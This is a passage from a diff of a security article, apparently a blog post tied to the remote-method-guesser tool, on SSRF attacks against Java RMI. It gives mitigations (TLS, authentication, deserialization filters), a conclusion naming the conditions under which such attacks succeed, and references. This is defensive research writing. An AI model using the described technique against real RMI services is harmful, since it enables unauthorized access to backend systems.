+   *remote-method-guesser* [\[2\]](#references). Depending on the installed version of *Java*, workarounds may be possible.
+2. Enable *TLS* protected communication for all *RMI* endpoints. Despite *Java RMI* sends mostly binary data that does not look readable,
+   it is actually a plain text protocol. All information passed to and received from an *RMI* service is sent in plain text and
+   can be read and modified by an attacker with a suitable position inside the network. If possible, you should also consider enabling
+   certificate based authentication for your *RMI* services.
+3. Implement authentication for your *RMI* services. All *remote objects* that perform sensitive operations should require users
+   to authenticate before they can be used. Especially *JMX* services should be password protected and use the *role* model of
+   *JMX* to only grant the required amount of privileges to authenticated users [\[8\]](#referneces).
+4. Make use of deserialization filters for your *RMI* services and only allow required types to be deserialized [\[9\]](#referneces).
+   Also make sure that your applications and third party libraries do not contain classes that perform dangerous actions when being
+   deserialized (*deserialization gadgets*).
+
+
+### Conclusion
+
+----
+
+In this article we demonstrated that *SSRF* attacks on *Java RMI* can work under certain circumstances:
+
+1. The *SSRF* vulnerability needs to allow arbitrary bytes being sent to the backend service (enables attacks on default *RMI* components
+   like the *RMI registry*, the *DGC* or the *Activation system*)
+2. The *SSRF* vulnerability needs to return responses from the backend service and accept arbitrary bytes within them (enables attacks
+   on all *RMI endpoints* like *JMX* or custom *remote objects*)
+
+If both of these conditions are satisfied, a backend *RMI service* can be consumed as with a direct connection
+using the *SSRF* vulnerability. If you ever encounter such a service, I would love to hear your experiences regarding
+*SSRF* based *RMI* attacks :)
 
 ### References
 
@@ -451,3 +631,9 @@ communicate to it.
 * \[1\] [Exploiting Tiny Tiny RSS](https://www.digeex.de/blog/tinytinyrss/)
 * \[2\] [remote-method-guesser (GitHub)](https://github.com/qtc-de/remote-method-guesser)
 * \[3\] [ssrf-example-server (GitHub)](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server)
+* \[4\] [GenericPrint rmg Plugin (GitHub)](https://github.com/qtc-de/remote-method-guesser/tree/master/plugins)
+* \[5\] [Server-Side Request Forgery Prevention Cheat Sheet (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
+* \[6\] [Server-side request forgery (PortSwigger)](https://portswigger.net/web-security/ssrf)
+* \[7\] [What is server-side request forgery (Acunetix)](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/)
+* \[8\] [Monitoring and Management Using JMX Technology (Oracle)](https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html)
+* \[9\] [Serialization Filtering (Oracle)](https://docs.oracle.com/javase/10/core/serialization-filtering1.htm)
